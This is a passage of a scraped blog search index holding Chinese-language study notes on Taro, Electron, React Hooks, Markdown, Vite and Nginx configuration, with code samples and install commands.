useState('')\ruseEffect(()=\u0026gt;{\rsetData(this.$router.params.data)\rsetName(this.$router.params.name)\rsetPass(this.$router.params.pass)\r},[])\r...\r\u0026lt;Text\u0026gt;{data}\u0026lt;/Text\u0026gt;\r\u0026lt;Text\u0026gt;{name}\u0026lt;/Text\u0026gt;\r\u0026lt;Text\u0026gt;{pass}\u0026lt;/Text\u0026gt;\r导入静态资源\nimport Taro ,{useState ,useEffect}from '@tarojs/taro'\rimport {View , Text ,Button, Image} from '@tarojs/components'\rimport {imgdata,cssdata} from '../../data' // 导入方法（函数）\rimport logo from '../../img/1.jpg' // 导入静态资源\ruseEffect(()=\u0026gt;{\rimgdata()\rcssdata()\r},[])\r...\r\u0026lt;Image src={newbbd} width=\u0026quot;300px\u0026quot; height=\u0026quot;300px\u0026quot; /\u0026gt;\r或者\n\u0026lt;Image src={require('../../img/1.jpg')} width=\u0026quot;300px\u0026quot; height=\u0026quot;300px\u0026quot; /\u0026gt;\r请求远程端口\nconst testData= ()=\u0026gt;{\rTaro.request({\rurl:'https://xxx.xxx/xxx'\r}).then(mainData=\u0026gt;{\rconsole.log(mainData.data)\r})\r}\rurl是目标接口，then()是请求完毕获取到的数据\n","permalink":"https://99999.fun/posts/92/","summary":"Taro是京东凹凸实验室推出的一个脚手架，设计目的是多端统一开发解决方案，一次开发，多端运行\nTaro可以使用React/Vue等前端框架开发的，当然typescript肯定是支持\nTaro官方文档：https://taro-docs.jd.com/taro/docs/README\nTaro支持微信小程序，百度小程序，支付宝小程序，字节小程序，QQ轻应用，ReactNatvie等等\n安装Taro脚手架\nnpm install -g @tarojs/cli\n或者\nyarn global add @tarojs/cli\n升级脚手架工具\ntaro update self\n创建项目\ntaro init hallo\n创建h5项目\nyarn dev:h5\n创建微信小程序项目\nyarn dev:weapp\n创建完毕会在dist目录下生成小程序程序\n作为一个可以使用react开发的脚手架，React Hooks和jsx也是支持的\nTaro组件化（Taro可以使用react开发，因此也具备react的组件化功能）\nimport Taro, { useState } from '@tarojs/taro'\rimport { View, Text } from '@tarojs/components'\rimport './index.less'\rfunction Main(){\rconst [count ,setUserName] = useState(\u0026quot;hallo word\u0026quot;)\rreturn ( \u0026lt;View\u0026gt;\r\u0026lt;Text\u0026gt;{count}\u0026lt;/Text\u0026gt;\r\u0026lt;/View\u0026gt;\r)\r}\rexport default Main\r子组件\nimport { View, Text } from '@tarojs/components'\rfunction Data(){\rreturn ( \u0026lt;View\u0026gt;\u0026lt;Text\u0026gt;hallo word\u0026lt;/Text\u0026gt;\u0026lt;/View\u0026gt;\r)\r}\rexport default Data\r导入","title":"Taro脚手架学习笔记"},{"content":"Electron是由github开发的开源框架，允许开发者使用web技术构建跨平台的桌面应用\nGUI由Chromium提供，底层通过Nodejs提供，Native API提供桌面端和跨平台的原生功能\nVisual Studio Code和Atom都是使用Electron开发的，可以说技术很成熟\n但是毕竟是基于Chromium的，打包出来的应用非常大，就算是个halloword，也要几百m\n安装Electron\nnpm install electron \u0026ndash;save-dev\n全局安装\nnpm install -g electron\n新建项目，并且在该目录下建立index.html文件和main.js\nmian.js是Electron应用的配置文件\n导入electron模块\nvar electron = require(\u0026rsquo;electron')\n创建Electron引用\nvar app = electron.app\n创建窗口引用\nvar BrowserWindow = electron.BrowserWindow\n声明主窗口\nvar mainWindow = null\n设置参数\napp.on('ready',()=\u0026gt;{\rmainWindow = new BrowserWindow({\r// 设置窗口大小\rwidth:500,\rheight:500,\rwebPreferences:{\rnodeIntegration: true\r// 是否集成node\r}\r}) mainWindow.loadFile('index.html') // 指定窗口加载那个页面\rmainWindow.on('closed',()=\u0026gt;{\rmainWindow = null\r// 监听销毁事件，事件触发关闭主窗口，设置为null\r})\r})\r初始化\nnpm init \u0026ndash;yes\n启动项目\nelectron .\n安装打包应用依赖\nnpm install electron-packager \u0026ndash;save-dev\n修改package.json文件\n\u0026ldquo;packager\u0026rdquo;: \u0026ldquo;electron-packager ./ halloword \u0026ndash;platform=all \u0026ndash;out=./App\u0026rdquo;\n./是项目路径，hallword是项目名字，\u0026ndash;platform=all是构建x86和x64构架，也可以指定win32或者win64\n\u0026ndash;out=./App是打包应用到哪个文件夹中\n启动打包应用\nnpm run-script packager\n加密app文件夹，避免程序暴露\n安装asar\nnpm install asar -g\n在项目中安装\nnpm install asar \u0026ndash;save-dev\n启动加密\nasar pack ./app app.asar\n","permalink":"https://99999.fun/posts/91/","summary":"Electron是由github开发的开源框架，允许开发者使用web技术构建跨平台的桌面应用\nGUI由Chromium提供，底层通过Nodejs提供，Native API提供桌面端和跨平台的原生功能\nVisual Studio Code和Atom都是使用Electron开发的，可以说技术很成熟\n但是毕竟是基于Chromium的，打包出来的应用非常大，就算是个halloword，也要几百m\n安装Electron\nnpm install electron \u0026ndash;save-dev\n全局安装\nnpm install -g electron\n新建项目，并且在该目录下建立index.html文件和main.js\nmian.js是Electron应用的配置文件\n导入electron模块\nvar electron = require(\u0026rsquo;electron')\n创建Electron引用\nvar app = electron.app\n创建窗口引用\nvar BrowserWindow = electron.BrowserWindow\n声明主窗口\nvar mainWindow = null\n设置参数\napp.on('ready',()=\u0026gt;{\rmainWindow = new BrowserWindow({\r// 设置窗口大小\rwidth:500,\rheight:500,\rwebPreferences:{\rnodeIntegration: true\r// 是否集成node\r}\r}) mainWindow.loadFile('index.html') // 指定窗口加载那个页面\rmainWindow.on('closed',()=\u0026gt;{\rmainWindow = null\r// 监听销毁事件，事件触发关闭主窗口，设置为null\r})\r})\r初始化\nnpm init \u0026ndash;yes","title":"简单利用Electron框架开发桌面端应用"},{"content":"React Hooks提供了新特性来给纯函数组件可以管理状态\n学过react都知道纯函数组件没有生命周期钩子，而且还不能更新状态，只有class组件有生命周期钩子和状态\n而一个好的组件要有高独立性，高可复用性，而class组件本身就是有状态，因此要复用起来比较麻烦，而且还有个this缺陷\nReact Hooks的出现，是因为类组件会继承React.Component父类，而React.Component父类拥有大量的方法和属性，在开发一些小型组件时，完全没有必要用到这么多的方法和属性，就好吧杀鸡用屠龙刀一样，可以但是没有必要，而纯函数组件就不存在这些方法和属性，可谓是轻量级\n例如：\nclass组件：\nclass Hi extends React.Component{\rconstructor(props) {\rsuper(props)\rthis.state = { count:0 }\r}\rrender(){\rconsole.log(this.state.count)\rreturn(\r\u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt;数据：{this.state.count}\u0026lt;/p\u0026gt;\r\u0026lt;button onClick={this.addGo.bind(this)}\u0026gt;GO\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\raddGo(){\rthis.setState({count:this.state.count+1})\r}\r}\r那么函数组件+React Hooks怎么实现状态更新呢？\n而function组件想更新状态可以通过React Hooks来实现，例如：\n例如：\nimport React, { useState } from 'react'\rfunction Hi(){\rconst [ count , setCount ] = useState(0)\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt; 数据：{count} \u0026lt;/p\u0026gt;\r\u0026lt;button onClick={()=\u0026gt;{setCount(count+1)}}\u0026gt;GO\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\r没错就是这么简单，看起来函数组件+React Hooks更简洁，更容易理解\nuseState是一个hook函数，是react原生自带的\nuseState提供了声明状态，读取状态，修改状态的方法\nconst [ count , setCount ] = useState(0)\n意思就是声明状态变量为count，count状态的初始值设置为0\n\u0026lt;button onClick={()=\u0026gt;{setCount(count+1)}}\u0026gt;GO\n而这个就是改变状态，调用setCount()函数来实现，该函数接受的参数是已经修改过的新状态，react就会进行重新渲染组件\n但是有一个坏处就是，如果存在多个状态，又没有key表示，如何知道状态是对于哪个useState呢？\n实质上是通过useState出现顺序来确定，如果对应的顺序不对就会报错，因此React Hooks不能出现于条件判断或者定时器之类会影响顺序的语句中\n状态有，生命周期也有\n例如：\nimport React, { useState , useEffect } from 'react'\rfunction Hi(){\rconst [ count , setCount ] = useState(0)\ruseEffect(()=\u0026gt;{\rconsole.log(\u0026quot;data:\u0026quot;+count)\r})\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt; 数据：{count} \u0026lt;/p\u0026gt;\r\u0026lt;button onClick={()=\u0026gt;{setCount(count+1)}}\u0026gt;GO\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\rexport default Hi;\r可以看到在第一次渲染和更新渲染都会执行一次，而在这里useEffect()的参数是一个匿名指针函数，函数里面是打印输出一句话，从这句话可以看出在第一次渲染的时候和更新的时候都会触发\nuseEffect()相当于componentDidMonut和componentDidUpdate\n而且useEffect()中定义的函数是异步执行的，而componentDidMonut和componentDidUpdate是同步执行，各有优点缺点\n实现类似componentWillUnmount生命周期钩子（组件销毁之前执行）的功能\n注意：useEffect会出现副作用，当每次的状态发生变化时候，useEffect都会进行解除绑定\n通过useEffect第二个参数，该参数是一个数组，该数组可以存放大量于状态相对应的变量，也可以了解为监控状态，而当传入空数组[]的时候，那么就是当组件被销毁才进行解除绑定，也就是说实现了componentWillUnmount的功能\nfunction Data() {\ruseEffect(()=\u0026gt;{\rconsole.log('hallo')\rreturn ()=\u0026gt;{\rconsole.log('goodbye')\r}\r},[])\rreturn (\u0026lt;div\u0026gt;data\u0026lt;/dv\u0026gt;);\r}\r父子组件传值useContext\n使用类组件的时候，父子组件之间传值是通过props进行的，但是函数组件并没有constructor构造函数，也因此没有props\n通过createContext函数创建useContext\nimport React, { useState , createContext, useContext } from 'react'\rconst CountContext = createContext()\r...\rconst [ count , setCount ] = useState(0);\r...\r\u0026lt;CountContext.Provider value={count}\u0026gt;\r\u0026lt;/CountContext.Provider\u0026gt;\r导入createContext函数，得到一个组件，并且通过该组件来传递或者使用状态\n接收状态\nconst count = useContext(CountContext) return ({count})\nRedux有3大核心概念：Action和Reducer和Store\n这个Redcuer是一个纯函数，这个函数可以接收两个参数，一个是状态，另一个是控制状态的判断参数，例如：\nfunction demoReducer(state, action) {\rswitch(action.type) {\rcase 'a':\rreturn state + 1\rcase 'b':\rreturn state - 1\rdefault: return state\r}\r}\ruseReducer是用于增强Redcuer来实现类似redux的功能，例如：\nimport React, { useReducer } from 'react'\rfunction demoReducer(){\rconst [ count , dispatch ] =useReducer((state,action)=\u0026gt;{\rswitch(action){\rcase 'a':\rreturn state+1\rcase 'b':\rreturn state-1\rdefault:\rreturn state\r}\r},0)\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h2\u0026gt;{count}\u0026lt;/h2\u0026gt;\r\u0026lt;button onClick={()=\u0026gt;dispatch('a')}\u0026gt;加\u0026lt;/button\u0026gt;\r\u0026lt;button onClick={()=\u0026gt;dispatch('b')}\u0026gt;减\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\rexport default demoReducer\ruseMemo优化hooks性能\nuseMemo用于解决无用渲染，函数组件不具备shouldCompnentUpdate生命周期钩子，因此不能通过该组件来决定组件是否更新，每一次调用函数组件都会执行组件内部的全部逻辑\nimport React , {useState,useMemo} from 'react'\r...\rconst [name, setName] = useState('root')\rconst data = useMemo(()=\u0026gt;{\rreturn {\rname\r}\r},[name])\ruseMemo第一个参数是()=\u0026gt;value，第二个参数是监听指定的值是否发生改变\n上面会根据name来判断一下，如果name值没有发生改变，那么就不会进行render，而是重复用之前的value，只要发生改变才会重新计算value\nuseRef可以获取jsx的dom元素，可以用于控制dom，也可以用来存储变量\n获取dom元素\nimport React, { useRef } from 'react'\rfunction Demo(){\rconst inputData = useRef(null)\rconst onDataClick=()=\u0026gt;{ inputData.current.value=\u0026quot;hallo，word\u0026quot;\rconsole.log(inputData) }\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;input ref={inputData} type=\u0026quot;text\u0026quot;/\u0026gt;\r\u0026lt;button onClick = {onDataClick}\u0026gt;显示\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\rexport default Demo\ruseRef存储变量\nconst [text, setText] = useState('goodbye')\rconst textRef = useRef()\ruseEffect(()=\u0026gt;{\rtextRef.current = text;\rconsole.log(textRef.current)\r})\r...\r\u0026lt;input value={text} onChange={(e)=\u0026gt;{setText(e.target.value)}} /\u0026gt;\r每次状态发生改变，都会在同时保存到useRef中\n自定义Hooks函数\n","permalink":"https://99999.fun/posts/90/","summary":"React Hooks提供了新特性来给纯函数组件可以管理状态\n学过react都知道纯函数组件没有生命周期钩子，而且还不能更新状态，只有class组件有生命周期钩子和状态\n而一个好的组件要有高独立性，高可复用性，而class组件本身就是有状态，因此要复用起来比较麻烦，而且还有个this缺陷\nReact Hooks的出现，是因为类组件会继承React.Component父类，而React.Component父类拥有大量的方法和属性，在开发一些小型组件时，完全没有必要用到这么多的方法和属性，就好吧杀鸡用屠龙刀一样，可以但是没有必要，而纯函数组件就不存在这些方法和属性，可谓是轻量级\n例如：\nclass组件：\nclass Hi extends React.Component{\rconstructor(props) {\rsuper(props)\rthis.state = { count:0 }\r}\rrender(){\rconsole.log(this.state.count)\rreturn(\r\u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt;数据：{this.state.count}\u0026lt;/p\u0026gt;\r\u0026lt;button onClick={this.addGo.bind(this)}\u0026gt;GO\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\raddGo(){\rthis.setState({count:this.state.count+1})\r}\r}\r那么函数组件+React Hooks怎么实现状态更新呢？\n而function组件想更新状态可以通过React Hooks来实现，例如：\n例如：\nimport React, { useState } from 'react'\rfunction Hi(){\rconst [ count , setCount ] = useState(0)\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt; 数据：{count} \u0026lt;/p\u0026gt;\r\u0026lt;button onClick={()=\u0026gt;{setCount(count+1)}}\u0026gt;GO\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\r没错就是这么简单，看起来函数组件+React Hooks更简洁，更容易理解","title":"React Hooks学习笔记"},{"content":"Markdown是一个标记语言，常用于编写文档\n标题\n一级标题 二级标题 三级标题 四级标题 五级标题 六级标题 分别对别h1到h6\n段落\n斜体文本\n斜体文本\n粗体文本\n粗体文本\n粗斜体文本\n粗斜体文本\n分割线\n删除线\nhallo\n脚注\n列表\n列表 列表 列表 1.列表\n区块\nxxx 代码\nxxx\nxxx\n链接\nchenjunlin\n图片\n表格\nxxx xxx yyy yyy yyy yyy :-表示左对齐，-:表示右对齐，:-:表示居中对齐\n转义\n*\n","permalink":"https://99999.fun/posts/88/","summary":"Markdown是一个标记语言，常用于编写文档\n标题\n一级标题 二级标题 三级标题 四级标题 五级标题 六级标题 分别对别h1到h6\n段落\n斜体文本\n斜体文本\n粗体文本\n粗体文本\n粗斜体文本\n粗斜体文本\n分割线\n删除线\nhallo\n脚注\n列表\n列表 列表 列表 1.列表\n区块\nxxx 代码\nxxx\nxxx\n链接\nchenjunlin\n图片\n表格\nxxx xxx yyy yyy yyy yyy :-表示左对齐，-:表示右对齐，:-:表示居中对齐\n转义\n*","title":"Markdown基础语法笔记"},{"content":"Vite是由 Vue.js 的作者尤雨溪开发完成的一款前端项目构建工具，使用原生ESM文件，支持热重载\nVite在法语中的意思为快速的\n基于原生 import 的，使用浏览器来解析import，服务端按需编译返回，支持热更新模块\n依赖于Rollup打包，虽然vite设计初衷是为了vue3.x的，但是也是支持其他框架（例如react）\n对于TypeScrip的支持程度相当好，只需要在script元素加lang=\u0026ldquo;ts\u0026quot;就可以使用ts了\n至于less，sass/scss之类的css预处理器以及css原生支持也是很好，Vite支持css样式直接引入（import \u0026lsquo;./app.css\u0026rsquo;）\nsass/scss使用（前提已经安装了sass）\n在style元素中加lang=\u0026ldquo;scss\u0026quot;就可以使用sass了\njson也是可以直接引入，例如：import data from \u0026lsquo;./data.json\u0026rsquo;\n另外对于JSX也是支持的，用.jsx表示jsx，例如：import App from \u0026lsquo;./App.jsx\u0026rsquo;\nvite有一套开发服务功能，基于原生es模块，ESM+HMR，而且还有一套项目构建指令，用rollup打包\n打包：指的是使用工具来抓取和处理源码模块，并且合成可以在浏览器上运行的文件（浏览器本身并不提供模块管理的机制，多模块需要很多的script标签，很繁琐臃肿，而打包就很好的解决了这个问题）\n常见的打包工具例如：webpack，rollup，parcel，gulp\n注意：当冷启动服务的时候，必须要先抓取并且构建应用（当应用越来越大，模块越来越多的时候，会导致服务启动缓慢），才能提供服务，而且进行模块更新的话，也会导致重建应用缓慢\n传统打包，是将多个模块打包成单一的文件，而esm打包，是根据http请求，来获取相应的route，再根据route来获取module（避免一开始就获取全部module）\nvite将模块分为依赖和源码，依赖指的是开发时不会发生改变的，vite将使用esbuild预构建依赖，而且将以原生ESM方式让浏览器接管打包源码\n构建Vite项目\nnpm create vite\n或者\nyarn create vite\n然后初始化一下\nnpm install\n或者\nyarn\n启动服务器\nvite\n或者\nnpm run dev，yarn dev\n本地预览\nvite preview\n打包\nvite build\nreact\nnpm create vite\n选择react，如果需要ts，也可以选择ts\nnpm install\nVite是一个构建工具的高阶封装（生产环境打包用Rollup来构建），开发环境无需要打包编译（利用现代浏览器的原生ESM来进行导入模块，模块加载的工作由浏览器完成，实现冷启动），支持动态模块热重载（HMR），开发环境的编译通过Esbuild来完成\nVite生产环境构建（也就是Rollup）是根据browserslist来做浏览器兼容性的，需要通过修改vite.config.ts下的build.target来指定构建目标，Vite最低支持es2015，也就是es6，需要es5以及更多浏览器可能无法正常运行或者通过@vitejs/plugin-legacy插件来获取支持（注意：使用该插件也不能让vue3支持ie11，只有vue2支持ie11）\n安装@vitejs/plugin-legacy\nyarn add @vitejs/plugin-legacy -d\r配置vite.config.ts\nimport legacy from '@vitejs/plugin-legacy'\r...\rplugins: [\rlegacy([\rtargets: ['defaults','no IE 11']\r])\r]\r...\rbuild: {\rtarget: 'es2015'\r}\r浏览器原生ESM导入\nindex.html\n\u0026lt;div id='app'\u0026gt;\u0026lt;/div\u0026gt;\r\u0026lt;script type='module' src='app.js'\u0026gt;\u0026lt;/script\u0026gt;\rapp.js\nimport { createApp } from 'vue'\rimport App form './App.vue'\rimport './index.css'\rcreateApp(App).mount(\u0026quot;#app\u0026quot;)\r浏览器解析index.html的时候，通过\u0026lt;script type=\u0026lsquo;module\u0026rsquo; src=\u0026lsquo;app.js\u0026rsquo;\u0026gt;得到app.js文件，而且声明该文件使用的ESM模块化的机制，然后对app.js导入的模块进行实时编译，实现按需加载\n因为其是利用了原生ESM模块化，因此Vite原生支持css，不需要额外配置，通过插入style元素来实现\nmain.js\nimport './index.css'\r使用less或者sass，postcss都很简单，Vite内置了配置，无需配置Vite\n安装less\nyarn add less -d\r安装sass\nyarn add sass -d\r安装postcss\nyarn add postcss -D\rpostcss是通过插件完成功能的，因此还得根据需要来安装插件（注意：postcss.config.js配置文件导入插件，不需要使用require()导入，而是直接写入字符串）\n使用typescript（vite默认支持typescript，但是只进行ts编译，不会进行校验）\nApp.vue\nimport { test } './index'\r让vite支持校验typescript\n安装typescript\nyarn add typescript -d\n修改package.json命令\n\u0026quot;scripts\u0026quot;: {\r\u0026quot;build\u0026quot;: \u0026quot;tsc --noEmit \u0026amp;\u0026amp; vite build\u0026quot;\r}\r添加tsconfig.json配置\n{\r\u0026quot;compilerOptions\u0026quot;: {\r\u0026quot;target\u0026quot;: \u0026quot;esnext\u0026quot;,\r\u0026quot;module\u0026quot;: \u0026quot;esnext\u0026quot;,\r\u0026quot;moduleResolution\u0026quot;: \u0026quot;node\u0026quot;,\r\u0026quot;strict\u0026quot;: true,\r\u0026quot;jsx\u0026quot;: \u0026quot;preserve\u0026quot;,\r\u0026quot;sourceMap\u0026quot;: true,\r\u0026quot;resolveJsonModule\u0026quot;: true,\r\u0026quot;esModuleInterop\u0026quot;: true,\r\u0026quot;lib\u0026quot;: [\u0026quot;esnext\u0026quot;,\u0026quot;dom\u0026quot;],\r\u0026quot;isolatedModules\u0026quot;: true,\r},\r\u0026quot;include\u0026quot;: [\r\u0026quot;src/**/*.ts\u0026quot;,\r\u0026quot;src/**/*.d.ts\u0026quot;,\r\u0026quot;src/**/*.tsx\u0026quot;,\r\u0026quot;src/**/*.vue\u0026quot;,\r],\r}\r注意：isolatedModules属性为true时，ts文件中如果不存在import和export时，ts会认定该模块不是ESM模块，设置的原因是Babel在转义阶段，会将ts的类型声明删除，这个时候如果export类型出现，Babel是不知道有这个类型存在的（因为js没有类型），导致前端报错，开启这个功能可以在开发阶段就提示错误（）\n校验.vue文件（vue-tsc）\n安装vue-tsc\nyarn add vue-tsc -d\r修改package.json命令\n\u0026quot;scripts\u0026quot;: {\r\u0026quot;build\u0026quot;: \u0026quot;vue-tsc --noEmit \u0026amp;\u0026amp; tsc --noEmit \u0026amp;\u0026amp; vite build\u0026quot;\r}\rvite集成eslint和pritter\n安装依赖\nnpm install eslint-config-standard eslint-plugin-import eslint-plugin-promise eslint-plugin-node -d\n.eslintrc.js，使用standard规则\nmodule.exports = {\rextends: 'standard',\r}\r.pritterrc（搭配vsc插件pritter使用，prettier用来格式化）\n{\r'semi': false,\r'singleQuote': true\r}\rvsc打开设置，搜索format on save，构选，再搜索formatter，选择prettier插件，保存时将会使用prettier进行代码格式化（让代码符合eslint规则）\nvite的HMR热更新API\nimport.meta可以返回当前模块的信息，需要在模块内部使用，由ECMAScript实现这个功能\n\u0026lt;script type='module'\u0026gt;\rconsole.log(import.meta)\r\u0026lt;/script\u0026gt;\r可以看到其返回的是一个对象，该对象有个url属性，这个url属性指向了模块的url，这个对象可以进行扩展\nvite通过扩展该对象，import.meta.hot手动暴露HMR（获取新的模块），例如：\nif(import.meta.hot){\rimport.meta.hot.accept((newMod) =\u0026gt;{\rnewMod.Dom()\r})\r}\r原理是服务端发现模块更新了，发送一个事件给客户端，客户端知道模块更新了，就通过发送请求获取最新的文件，将老的模块替换成新的，就实现热更新功能了\nvite批量导入\nconst mods = import.meta.glob('./src/*')\rconsole.log(mods)\r可以看到输出了一个键值对，键为文件名，值为该文件的import\nObject.entries(mods).forEach([a,b]) =\u0026gt;{\rb().then(mod =\u0026gt; {\rconsole.log(mod.default)\r})\r}\r预编译（运行vite项目，会在node_modules下创建一个.vite文件夹，这个文件夹是vite的依赖，直接读取这个依赖就可以了）\n预编译的另一个作用是可以将多个依赖文件整合成一个文件，可以通过optimizeDeps，exclude禁止预编译某个依赖来查看\n","permalink":"https://99999.fun/posts/87/","summary":"Vite是由 Vue.js 的作者尤雨溪开发完成的一款前端项目构建工具，使用原生ESM文件，支持热重载\nVite在法语中的意思为快速的\n基于原生 import 的，使用浏览器来解析import，服务端按需编译返回，支持热更新模块\n依赖于Rollup打包，虽然vite设计初衷是为了vue3.x的，但是也是支持其他框架（例如react）\n对于TypeScrip的支持程度相当好，只需要在script元素加lang=\u0026ldquo;ts\u0026quot;就可以使用ts了\n至于less，sass/scss之类的css预处理器以及css原生支持也是很好，Vite支持css样式直接引入（import \u0026lsquo;./app.css\u0026rsquo;）\nsass/scss使用（前提已经安装了sass）\n在style元素中加lang=\u0026ldquo;scss\u0026quot;就可以使用sass了\njson也是可以直接引入，例如：import data from \u0026lsquo;./data.json\u0026rsquo;\n另外对于JSX也是支持的，用.jsx表示jsx，例如：import App from \u0026lsquo;./App.jsx\u0026rsquo;\nvite有一套开发服务功能，基于原生es模块，ESM+HMR，而且还有一套项目构建指令，用rollup打包\n打包：指的是使用工具来抓取和处理源码模块，并且合成可以在浏览器上运行的文件（浏览器本身并不提供模块管理的机制，多模块需要很多的script标签，很繁琐臃肿，而打包就很好的解决了这个问题）\n常见的打包工具例如：webpack，rollup，parcel，gulp\n注意：当冷启动服务的时候，必须要先抓取并且构建应用（当应用越来越大，模块越来越多的时候，会导致服务启动缓慢），才能提供服务，而且进行模块更新的话，也会导致重建应用缓慢\n传统打包，是将多个模块打包成单一的文件，而esm打包，是根据http请求，来获取相应的route，再根据route来获取module（避免一开始就获取全部module）\nvite将模块分为依赖和源码，依赖指的是开发时不会发生改变的，vite将使用esbuild预构建依赖，而且将以原生ESM方式让浏览器接管打包源码\n构建Vite项目\nnpm create vite\n或者\nyarn create vite\n然后初始化一下\nnpm install\n或者\nyarn\n启动服务器\nvite\n或者\nnpm run dev，yarn dev\n本地预览\nvite preview\n打包\nvite build\nreact\nnpm create vite\n选择react，如果需要ts，也可以选择ts\nnpm install\nVite是一个构建工具的高阶封装（生产环境打包用Rollup来构建），开发环境无需要打包编译（利用现代浏览器的原生ESM来进行导入模块，模块加载的工作由浏览器完成，实现冷启动），支持动态模块热重载（HMR），开发环境的编译通过Esbuild来完成\nVite生产环境构建（也就是Rollup）是根据browserslist来做浏览器兼容性的，需要通过修改vite.config.ts下的build.target来指定构建目标，Vite最低支持es2015，也就是es6，需要es5以及更多浏览器可能无法正常运行或者通过@vitejs/plugin-legacy插件来获取支持（注意：使用该插件也不能让vue3支持ie11，只有vue2支持ie11）\n安装@vitejs/plugin-legacy\nyarn add @vitejs/plugin-legacy -d\r配置vite.config.ts\nimport legacy from '@vitejs/plugin-legacy'\r.","title":"简单使用Vite-前端构建工具"},{"content":"Nginx是目前web服务器占比第一（在https://w3techs.com 中可以看到Nginx占比33.1%）\nNginx支持静态资源提供服务，支持高并发，热部署，反向代理，缓存，负载均衡等功能，Nginx使用BSD许可证开源（允许修改Nginx源码来重新发布一个商业用途的（例如Tengine））\nNginx由Nginx二进制可执行文件，Nginx.conf，access.log，error.log组成\nNginx和Nginx plus的区别：Nginx开源，免费，Nginx plus闭源，不免费\nNginx编译安装\nMainline version版本是提供最新的功能，Stable version版本是目前的稳定版本，Legacy versions版本是过去的版本\n下载Nginx\nwget http://nginx.org/download/nginx-1.22.0.tar.gz\n解压Nginx压缩包\ntar -xzf nginx-1.22.0.tar.gz\n其中auto目录有4个子目录（分别为cc（用于编译），lib（lib库），os（操作系统的判断），types（类型判断）），conf目录是Nginx配置目录，html目录是Nginx默认静态文件\nconf目录是Nginx配置文件目录（例如nginx.conf），src目录是Nginx源代码目录\n进入nginx目录然后进行编译\n查看编译时支持的参数\n./configure \u0026ndash;help | more\n使用默认参数编译\n./configure \u0026ndash;prefix=/home/nginx\n编译完成的中间文件存会放在objs文件夹下\nngx_module.c是要编译进Nginx的模块，如果需要安装第三方模块需要在其修改\nmake编译\nmake install安装\n进入/home/nginx，可以看到已经安装完成\n安装\n编译安装\napt install -y gcc gcc-c++ pcre pcre-devel openssl openssl-devel zlib zlib-devel\nwget http://nginx.org/download/nginx-1.22.0.tar.gz\ntar -zxvf nginx-1.18.0.tar.gz\ncd nginx-1.18.0\nmake \u0026amp;\u0026amp;make install\n一键安装（不推荐）\napt install nginx\n检查是否安装完毕\nnginx -v\nnginx配置文件nginx.conf解读，一般在/etc/nginx下\nuser root; # nginx运行用户\rworker_processes auto; # nginx进程数，一般会设置和CPU核数一致\rerror_log /www/wwwlogs/nginx_error.log crit; # 错误日志存储位置\rpid /www/server/nginx/logs/nginx.pid; # 进程PID存储位置\revents{\rworker_connections 51200; # 单个后台进程的最大并发数\rmulti_accept on; # 一个进程可以同时接受所有的新连接，关闭（off）的话一个进程只能接收一个连接，默认值为off关闭\r}\rhttp{\rinclude mime.types; # 文件扩展和类型的映射表\rdefault_type application/octet-stream; # 默认文件的类型\rserver_names_hash_bucket_size 512;\rclient_header_buffer_size 32k;\rlarge_client_header_buffers 4 32k;\rclient_max_body_size 50m;\rgzip on; # 开启gzip压缩\rgzip_min_length 1k; # 设置允许压缩的最小的字节数，这里设置1k，就是只有超过1k的文件才会被压缩\rgzip_buffers 4 16k; # 以16k为单位，以16k的4倍申请存储gzip压缩的数据流内存\rgzip_http_version 1.1; # 只有当http1.1协议版本可以执行gzip压缩\rgzip_comp_level 2; # 压缩比\rgzip_types text/plain application/javascript application/x-javascript text/javascript text/css application/xml; # 设置匹配MIME类型进行压缩，默认text/html是始终被压缩的\rgzip_vary on;\rgzip_proxied expired no-cache no-store private auth; # 当nginx是反向代理时数据的压缩，expired表示启动压缩，如果header头中包含 \u0026quot;Expires\u0026quot; 头信息，，只有off是关闭数据压缩，any是无条件启动压缩\rserver_tokens off; # 隐藏版本号，避免404暴露nginx的版本\raccess_log off; # nginx访问日志存储位置（off为关闭访问日志）\rserver\r{\rlisten 80; # 监听端口\rserver_name localhost; # 配置域名\rindex index.html index.htm index.php; # 默认页面\rroot /www/server/phpmyadmin; # 服务默认启动目录\rerror_page 404 /404.html; # 404配置页面\rerror_page 500 502 503 504 /50x.html # 50x服务错误配置页面\rinclude fastcgi.conf; # 使用fastCGI解析php\rlocation /\r{\rroot /www/wwwroot; index index.html index.htm index.php;\r}\raccess_log /www/wwwlogs/access.log; # nginx访问日志存储位置（off为关闭访问日志）\r}\r可以看到网站根目录在/www/wwwroot\n强制停止nginx服务 nginx -s stop\n非强制停止（等待进程完成任务后停止） nginx -s quit\n重载配置文件 nginx -s reload\n限制访问权限\nlocation /\r{\rroot /www/wwwroot; index index.html index.htm index.php;\rallow 192.168.1.128; # 限制只有192.168.1.128可访问\rdeny all # 禁止访问\r}\rnginx虚拟主机（可基于端口，域名（ip），别名设置虚拟主机）\nserver{\rlisten 80; server_name localhost;\rindex index.html index.htm index.php; }\rserver{\rlisten 80;\rserver_name abc.xiaochenabc123.test.com;\rindex index.html index.htm index.php; }\rserver{\rlisten 80; # 监听端口\rlisten 443 ssl http2; # 设置https ssl\rserver_name xiaochenabc123.test.com; # 配置域名\rindex index.php index.html index.htm default.php default.htm default.html;\r}\r在上面例子中，可以看到端口都是80，但是域名不同，也就是说这里设置了3个虚拟主机，虚拟主机配置除了设置在/nginx/nginx.conf中，还可以设置在子配置文件（nginx/conf.d/default.conf）中，不同的虚拟主机都可设置在不同的子配置文件中\n反向代理\nserver{\rlisten 80;\rserver_name abc.xiaochenabc123.test.com;\rlocation / {\rproxy_pass http://xiaochenabc123.test.com;\rindex 